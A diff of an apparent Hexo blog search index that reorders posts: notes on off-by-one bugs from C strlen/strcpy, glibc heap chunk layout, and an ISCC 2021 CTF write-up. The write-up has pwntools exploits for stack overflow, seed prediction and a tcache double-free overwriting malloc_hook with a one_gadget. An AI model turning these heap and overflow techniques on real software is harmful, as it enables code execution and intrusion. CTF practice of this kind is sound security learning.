@@ -163,19 +163,6 @@
       </categories>
   </entry>
   <entry>
-    <title>C语言中常见漏洞点</title>
-    <url>/article/C/</url>
-    <content><![CDATA[<h1 id="记录常见漏洞点"><a href="#记录常见漏洞点" class="headerlink" title="记录常见漏洞点"></a>记录常见漏洞点</h1><span id="more"></span>
-
-<h1 id="C语言函数"><a href="#C语言函数" class="headerlink" title="C语言函数"></a>C语言函数</h1><h2 id="strlen"><a href="#strlen" class="headerlink" title="strlen"></a>strlen</h2><p>计算 ascii 字符串长度的函数</p>
-<p>这个函数在计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的</p>
-<h2 id="strcpy"><a href="#strcpy" class="headerlink" title="strcpy"></a>strcpy</h2><p>在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code>，能造成 NULL byte off-by-one </p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-  </entry>
-  <entry>
     <title>DASCTF_2021_3</title>
     <url>/article/DASCTF_2021_3/</url>
     <content><![CDATA[<p>DASCTF 2021三月赛</p>
@@ -222,6 +209,64 @@
       </categories>
       <tags>
         <tag>EIP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>C语言中常见漏洞点</title>
+    <url>/article/C/</url>
+    <content><![CDATA[<h1 id="记录常见漏洞点"><a href="#记录常见漏洞点" class="headerlink" title="记录常见漏洞点"></a>记录常见漏洞点</h1><span id="more"></span>
+
+<h1 id="C语言函数"><a href="#C语言函数" class="headerlink" title="C语言函数"></a>C语言函数</h1><h2 id="strlen"><a href="#strlen" class="headerlink" title="strlen"></a>strlen</h2><p>计算 ascii 字符串长度的函数</p>
+<p>这个函数在计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的</p>
+<h2 id="strcpy"><a href="#strcpy" class="headerlink" title="strcpy"></a>strcpy</h2><p>在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code>，能造成 NULL byte off-by-one </p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Heap_Learn</title>
+    <url>/article/Heap_Learn/</url>
+    <content><![CDATA[<h1 id="Heap-Learn"><a href="#Heap-Learn" class="headerlink" title="Heap_Learn"></a>Heap_Learn</h1><span id="more"></span>
+
+<h1 id="堆相关数据结构"><a href="#堆相关数据结构" class="headerlink" title="堆相关数据结构"></a>堆相关数据结构</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- chunk </span><br><span class="line">| 		prev_size		 |	  	size  		|A|M|P|</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">| user data	(fd)		 |	 	(bk)			  |</span><br><span class="line">|												|</span><br><span class="line">|												|</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- next chunk</span><br></pre></td></tr></table></figure>
+
+<p><strong>prev_size</strong>，物理相邻的前一个chunk是空闲的话，则记录前一个chunk的大小（包括chunk头）；<br>                    若前一个chunk处于使用状态，则可以存储前一个chunk的数据。<strong>这是 chunk 中的空间复用</strong></p>
+<p><strong>size</strong>，必须是 2 * SIZE_SZ 的整数倍。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。</p>
+<ul>
+<li>A：NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li>
+</ul>
+<ul>
+<li><p>M：IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</p>
+</li>
+<li><p>P：<strong>PREV_INUSE</strong>，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</p>
+</li>
+</ul>
+<p><strong>fd</strong>，<strong>bk</strong> 。chunk在分配状态下存储数据，在free了chunk之后：</p>
+<ul>
+<li>fd 指向下一个空闲的chunk（非物理相邻）</li>
+<li>bk指向上一个空闲的chunk（非物理相邻）</li>
+</ul>
+<h1 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞的产生与边界验证不严和字符串操作有关，包括</p>
+<ul>
+<li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li>
+<li>字符串操作不合适</li>
+</ul>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol>
+<li><p>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</p>
+</li>
+<li><p>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。</p>
+<p>（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。</p>
+<p>（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code>     找到的块的大小与<code>prev_size</code> 是否一致。</p>
+</li>
+</ol>
+<h1 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h1><p>当 large bin 中只存在一个chunk，那么该 chunk 的两个 nextsize指针都会指向自己</p>
+]]></content>
+      <categories>
+        <category>WriteUp</category>
+      </categories>
+      <tags>
+        <tag>Heap</tag>
       </tags>
   </entry>
   <entry>
@@ -308,56 +353,54 @@
       </categories>
   </entry>
   <entry>
-    <title>Heap_Learn</title>
-    <url>/article/Heap_Learn/</url>
-    <content><![CDATA[<h1 id="Heap-Learn"><a href="#Heap-Learn" class="headerlink" title="Heap_Learn"></a>Heap_Learn</h1><span id="more"></span>
-
-<h1 id="堆相关数据结构"><a href="#堆相关数据结构" class="headerlink" title="堆相关数据结构"></a>堆相关数据结构</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- chunk </span><br><span class="line">| 		prev_size		 |	  	size  		|A|M|P|</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">| user data	(fd)		 |	 	(bk)			  |</span><br><span class="line">|												|</span><br><span class="line">|												|</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- next chunk</span><br></pre></td></tr></table></figure>
-
-<p><strong>prev_size</strong>，物理相邻的前一个chunk是空闲的话，则记录前一个chunk的大小（包括chunk头）；<br>                    若前一个chunk处于使用状态，则可以存储前一个chunk的数据。<strong>这是 chunk 中的空间复用</strong></p>
-<p><strong>size</strong>，必须是 2 * SIZE_SZ 的整数倍。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。</p>
-<ul>
-<li>A：NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li>
-</ul>
-<ul>
-<li><p>M：IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</p>
-</li>
-<li><p>P：<strong>PREV_INUSE</strong>，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</p>
-</li>
-</ul>
-<p><strong>fd</strong>，<strong>bk</strong> 。chunk在分配状态下存储数据，在free了chunk之后：</p>
-<ul>
-<li>fd 指向下一个空闲的chunk（非物理相邻）</li>
-<li>bk指向上一个空闲的chunk（非物理相邻）</li>
-</ul>
-<h1 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞的产生与边界验证不严和字符串操作有关，包括</p>
-<ul>
-<li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li>
-<li>字符串操作不合适</li>
-</ul>
-<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol>
-<li><p>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</p>
-</li>
-<li><p>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。</p>
-<p>（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。</p>
-<p>（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code>     找到的块的大小与<code>prev_size</code> 是否一致。</p>
-</li>
-</ol>
-<h1 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h1><p>当 large bin 中只存在一个chunk，那么该 chunk 的两个 nextsize指针都会指向自己</p>
-]]></content>
-      <categories>
-        <category>WriteUp</category>
-      </categories>
-      <tags>
-        <tag>Heap</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ISCC_2021</title>
     <url>/article/ISCC_2021/</url>
     <content><![CDATA[<h1 id="title"><a href="#title" class="headerlink" title="title"></a>title</h1>]]></content>
       <categories>
         <category>WriteUp/笔记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>ISCC_2021</title>
+    <url>/article/ISCC_2021/</url>
+    <content><![CDATA[<h1 id="ISCC-2021"><a href="#ISCC-2021" class="headerlink" title="ISCC_2021"></a>ISCC_2021</h1><span id="more"></span>
+
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="M78"><a href="#M78" class="headerlink" title="M78"></a>M78</h2><p>保护</p>
+<p><img src="/article/ISCC_2021/image-20210526132438302.png" alt="image-20210526132438302"></p>
+<p>ida</p>
+<p>给了 system(“/bin/sh”)</p>
+<p><img src="/article/ISCC_2021/image-20210526132504575.png" alt="image-20210526132504575"></p>
+<p>漏洞在对 password 的检查 check 函数中</p>
+<p><img src="/article/ISCC_2021/image-20210526132549268.png" alt="image-20210526132549268"></p>
+<p>password 长度限制长度为7，然后 strcpy 到 dest，通过 s 溢出给 dest，达到栈溢出。</p>
+<p>但长度被限制了，无法直接栈溢出。</p>
+<p>想到程序是32bit，strlen函数指取寄存器的低位，而 strcpy函数是直到 ‘\x00’ 才停止。</p>
+<p>我们发送的payload是0x107位就能使得strlen==7。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./M78&#x27;</span>)</span><br><span class="line"></span><br><span class="line">call_main = <span class="number">0x08049202</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice?&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please choose a building&#x27;</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>) + p32(call_main)</span><br><span class="line">payload = payload.ljust(<span class="number">0x106</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input the password&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>保护</p>
+<p><img src="/article/ISCC_2021/image-20210526180142223.png" alt="image-20210526180142223"></p>
+<p>ida</p>
+<p><img src="/article/ISCC_2021/image-20210526180156262.png" alt="image-20210526180156262"></p>
+<p><img src="/article/ISCC_2021/image-20210526180206793.png" alt="image-20210526180206793"></p>
+<p>c语言写程序跑一遍</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    srand(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">10</span>;i++)&#123;</span><br><span class="line">        a = rand();</span><br><span class="line">        srand(a);</span><br><span class="line">        b = rand()%<span class="number">100</span>+<span class="number">1</span>;</span><br><span class="line">	    <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,b); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/ISCC_2021/image-20210526182640652.png" alt="image-20210526182640652"></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./game&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = [<span class="number">55</span>,<span class="number">15</span>,<span class="number">82</span>,<span class="number">1</span>,<span class="number">98</span>,<span class="number">68</span>,<span class="number">67</span>,<span class="number">15</span>,<span class="number">86</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span> + p32(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your name is :&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Guess Number:&#x27;</span>,<span class="built_in">str</span>(s[i]))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="box"><a href="#box" class="headerlink" title="box"></a>box</h2><p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;39.96.88.40&#x27;</span>,<span class="number">7020</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,length,data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the size:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input data:&#x27;</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the data:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here is it :&#x27;</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)-<span class="number">0x260</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(heap+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x78</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x78</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;\xff&#x27;</span>*<span class="number">8</span>*<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here is it :&#x27;</span>)</span><br><span class="line">main = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">96</span></span><br><span class="line">malloc_hook = main - <span class="number">0x10</span></span><br><span class="line">libc = main - <span class="number">0x3ebc40</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(main)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(malloc_hook)</span><br><span class="line"></span><br><span class="line">one_gadget=[<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;\x01&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0</span>)*<span class="number">7</span> + p64(<span class="number">0</span>) + p64(malloc_hook))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x20</span>,p64(libc+<span class="number">0x10a38c</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input the index:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input the size:&#x27;</span>,<span class="string">&#x27;0x20&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>比赛WriteUp</category>
       </categories>
   </entry>
   <entry>
@@ -436,49 +479,6 @@
     <content><![CDATA[<h1 id="title"><a href="#title" class="headerlink" title="title"></a>title</h1>]]></content>
       <categories>
         <category>WriteUp/笔记</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>ISCC_2021</title>
-    <url>/article/ISCC_2021/</url>
-    <content><![CDATA[<h1 id="ISCC-2021"><a href="#ISCC-2021" class="headerlink" title="ISCC_2021"></a>ISCC_2021</h1><span id="more"></span>
-
-<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="M78"><a href="#M78" class="headerlink" title="M78"></a>M78</h2><p>保护</p>
-<p><img src="/article/ISCC_2021/image-20210526132438302.png" alt="image-20210526132438302"></p>
-<p>ida</p>
-<p>给了 system(“/bin/sh”)</p>
-<p><img src="/article/ISCC_2021/image-20210526132504575.png" alt="image-20210526132504575"></p>
-<p>漏洞在对 password 的检查 check 函数中</p>
-<p><img src="/article/ISCC_2021/image-20210526132549268.png" alt="image-20210526132549268"></p>
-<p>password 长度限制长度为7，然后 strcpy 到 dest，通过 s 溢出给 dest，达到栈溢出。</p>
-<p>但长度被限制了，无法直接栈溢出。</p>
-<p>想到程序是32bit，strlen函数指取寄存器的低位，而 strcpy函数是直到 ‘\x00’ 才停止。</p>
-<p>我们发送的payload是0x107位就能使得strlen==7。</p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./M78&#x27;</span>)</span><br><span class="line"></span><br><span class="line">call_main = <span class="number">0x08049202</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice?&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please choose a building&#x27;</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>) + p32(call_main)</span><br><span class="line">payload = payload.ljust(<span class="number">0x106</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input the password&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>保护</p>
-<p><img src="/article/ISCC_2021/image-20210526180142223.png" alt="image-20210526180142223"></p>
-<p>ida</p>
-<p><img src="/article/ISCC_2021/image-20210526180156262.png" alt="image-20210526180156262"></p>
-<p><img src="/article/ISCC_2021/image-20210526180206793.png" alt="image-20210526180206793"></p>
-<p>c语言写程序跑一遍</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    srand(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">10</span>;i++)&#123;</span><br><span class="line">        a = rand();</span><br><span class="line">        srand(a);</span><br><span class="line">        b = rand()%<span class="number">100</span>+<span class="number">1</span>;</span><br><span class="line">	    <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,b); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/ISCC_2021/image-20210526182640652.png" alt="image-20210526182640652"></p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./game&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = [<span class="number">55</span>,<span class="number">15</span>,<span class="number">82</span>,<span class="number">1</span>,<span class="number">98</span>,<span class="number">68</span>,<span class="number">67</span>,<span class="number">15</span>,<span class="number">86</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span> + p32(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your name is :&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Guess Number:&#x27;</span>,<span class="built_in">str</span>(s[i]))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="box"><a href="#box" class="headerlink" title="box"></a>box</h2><p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;39.96.88.40&#x27;</span>,<span class="number">7020</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,length,data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the size:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input data:&#x27;</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the data:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span 